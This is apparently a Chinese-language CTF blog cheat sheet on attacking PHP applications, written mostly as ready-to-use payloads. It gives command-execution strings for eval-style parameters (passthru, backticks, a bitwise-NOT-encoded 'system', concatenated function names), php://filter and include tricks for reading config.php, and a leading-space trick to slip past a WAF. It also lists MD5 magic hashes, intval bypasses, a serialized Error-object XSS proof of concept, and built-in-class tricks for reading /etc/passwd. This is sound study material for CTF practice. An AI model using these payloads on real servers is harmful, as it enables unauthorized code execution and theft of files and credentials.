---
title: PHP
author: Creexile
date: 2024-03-08
lastMod: 2025-04-10
summary: 'PHP利用和绕过'
cover: ''
category: 'CTF'
draft: false
comments: false
sticky: 0
tags: [PHP]
---

# "换"变量绕过

当php进行解析时，如果变量名前面有空格，php会自动去掉前面的空格再进行解析

所以, 假如 waf 不允许 `num` 变量接收字母，那么使用 `  num` 就可以（前面有个空格）

同理, 当 `?num=phpinfo()` 报错，那就试试`? num=phpinfo()`

# 弱比较和强比较

| 类型   | 常见       | 原因                                                                                                                                                    |
| ------ | ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 弱比较 | `==`, `!=` | 在比较时会把两边转化为同一类型然后比较值是否相等<br />比较一个数字和字符串或者比较涉及到数字内容的字符串，会被转换成数值并且比较按照数值来进行,舍弃字母 |
| 强比较 | `===`      | 等号两边类型和值必须都相等，否则返回"false"                                                                                                             |

> 数值转化规则：
> 在转化时，PHP会从头开始挨个读取数据，在获取到整数时保留，当读取到第一个非数字时，舍弃包括该位之后的全部字符（不包含小数点, e, E）
>
> 在遇到e、E时，会按科学计数法处理

# 常见过滤绕过

部分字符被绕过可以用ascii码进行转换绕过(方法不止一种)

```
对目录进行扫描
?num=var_dump(scandir(chr(47)))

字符串全变
? num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))
```

## 命令执行

过滤了system，那我们换成 passthru, echo, eval 等

```shell
利用 php 的 echo：
?c=”echo `tac config.php`;"
echo file_get_contents(‘config.php’);

利用其他函数同上:
?c=passthru(‘cat config.php’);
?c=passthru(‘config.php’);
?c=show_source(“config.php”);

利用php伪协议读取文件：
?c=include("php://filter/convert.base64-encode/resource=config.php");

字符串拼接：?c=$a='sys';$b='tem';$d=$a.$b;$d('cat config.php');

字符串取反构造
?c=(~%8C%86%8C%8B%9A%92)('ls');
?c=(~%8C%86%8C%8B%9A%92)('cat config.php');
```

这个是system取反得到的，脚本实现方法是

```php
<?php
$a=~("system");
echo urlencode($a);
?>
```

还是passthru：其中?>闭合前面的php语句,阻断后面的语句继续执行

```
passthru(‘tac \`ls\`’);?>
```

一些隔断：
`?c=passthru('tac confi\*\*\*hp');`
`?c=passthru('tac confi/hp');`

模糊匹配：当当前路径下只有一个c开头的config.php文件，
`passthru('tac c*')?>`

前面是语句，后面是恶意代码, 这样就可以自动取得a并且执行了
`?c= include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=config.php`

或者用hackbar, 然后POST中输入a=cat config.php

```shell
?c=echo `$_POST[a]`;
```

## md5(string,raw)

### 弱比较

用数组和0e方法绕过

```
byGcY
0e591948146966052067035298880982

QNKCDZO
0e830400451993494058024219903391

240610708
0e462097431906509019562988736854

s878926199a
0e545993274517709034328855841020

s155964671a
0e342768416822451524974117254469

s214587387a
0e848240448830537924465865611904
```

### 两次MD5

这个一般都是弱比较, 也有两次md5加密后还是0e开头的
|原字符串|一次MD5|两次MD5|
|:--|---|---|
|CbDLytmyGm2xQyaLNhWn | 0ec20b7c66cafbcc7d8e8481f0653d18|0e3a5f2a80db371d4610b8f940d296af|
|770hQgrBOjrcqftrlaZk|0e689b4f703bdc753be7e27b45cb3625|0e2756da68ef740fd8f5a5c26cc45064|
|7r4lGXCH2Ksu2JNT3BYM|0e269ab12da27d79a6626d91f34ae849|0e48d320b2a97ab295f5c4694759889f|

### md5与自身相等

0e215962017

### 强比较

依然是数组绕过, 当数组绕过不成立, 就用工具构造md5碰撞

### strings强转

利用工具直接构造md5相等的字符串

如果限制了a和b的长度, **利用浮点数的小数点精度问题, string强转后会构造出相同的字符串**

```php
<?php
highlight_file(__FILE__);

$a = 0.500000000000004;
$b = 0.5;

echo "<br>";
echo (string)$a."<br>";
echo strlen((string)$a)."<br>";

if(md5((string)$a) === md5((string)$b)){
        echo "a == b";
    }
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241111120758.png)

还有更极端一点的, 比如长度必须小于等于三且三个部分不相等

```php
<?php
highlight_file(__FILE__);
echo "<br>";

$d = 0e-10;
$s = '';
$b = '.1';
$ctf = 0.1;

$d = (string)$d;
$s = (string)$s;
$b = (string)$b;

if (($d != $s) && ($d != $b) && ($s != $b)) {
   $dsb = $d.$s.$b;
    echo $dsb."<br>";
    echo (string)$dsb."<br>";
    echo strlen((string)$dsb)."<br>";
    if (md5($dsb) === md5($ctf)) {
        echo "always equal md5"."<br>";
    }
}
```

## intval()绕过:

PHP_5 和PHP_7 的 intval() 规则不一样

PHP_5中，intval() 会按照数值转化规则（从头开始挨个读取数据，在获取到整数时保留，当读取到第一个非数字时，舍弃包括该位之后的全部字符), 很多能用的漏洞都要求php版本正确

- 运算
- URL编码
- ASCII编码
- SQL注入
- Power函数
- 取反
- 引号包裹
- 内联注释

### Intval($id)>num

- 单引号绕过：’1000’
- 计算绕过：500/0.5
- 函数绕过：power(10,3)
- 连接符绕过：?id=100||id=1000
- 取反两次绕过：id=\~\~1000
- 二进制绕过：0b1111101000
- 其他：?id=/\*\*/1000

# php内置类

## Error, Exception进行XSS, 绕过Hash比较

### 条件

需要有报错的情况:

- Error: 适用于 PHP 7
- Exception: 适用于PHP 5和7

### XSS

```php
<?php	// 测试代码
    $a = unserialize($_GET['whoami']);
    echo $a;
?>
```

```php
<?php	//poc
$a = new Error("<script>alert('xss')</script>");
$b = serialize($a);
echo urlencode($b);
?>
```

传入的话会弹出窗口显示`xss`

### Hash绕过

这两个异常对象是不同的（异常代码不同）但`__toString()`方法的输出的结果一模一样

***\_\_toString 返回的数据包含当前行号***所以要在同一行写该类调用

例题: [[2020 极客大挑战]Greatphp](https://so.csdn.net/so/search?q=%5B2020%20%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%5DGreatphp&t=&u=&urw=)

## 内置类读目录, 文件

- Directorylterator (PHP 5, PHP 7, PHP 8)

DirectoryIterator与glob://协议结合可以进行目录读取, 显示出当前目录下的文件信息

```php
// 读取到根目录的文件
DirectoryIterator(glob:///*);
```

- FilesystemIterator (PHP 5 >= 5.3.0, PHP 7, PHP 8)
  FilesystemIterator继承自DirectoryIterator,
  基本是一样的语法, 但这个类会以绝对路径形式展现

```php
// 读取 root 下文件
FilesystemIterator(glob:///root/*);
```

- Globlterator (PHP 5 >= 5.3.0, PHP 7, PHP 8)
  和上面两个差不多, 以绝对路径形式展现, 可以通过模式匹配来寻找文件路径

```php
// 读取 bin 下的文件
Globlterator(/bin/*);
```

- SplFileObject (PHP 5 >= 5.1.0, PHP 7, PHP 8)
  读取文件内容

```php
// 读取 /etc/passwd 文件内容
SplFileObject(/etc/passwd);
```

## SimpleXMLElement - XXE

远程包含xml文件

## SoapClient - SSRF

适用于 PHP 5、PHP 7、PHP 8, 只局限于http、https协议

## ReflectionMethod - 获取注释内容

适用于 PHP 5 >= 5.1.0, PHP 7, PHP 8
`ReflectionFunction` 类的 `getDocComment()` 方法可以获取注释内容

# 其他

列出当前目录

```
foreach (glob("./*") as $filename) {  echo $filename."<br>"; }
```
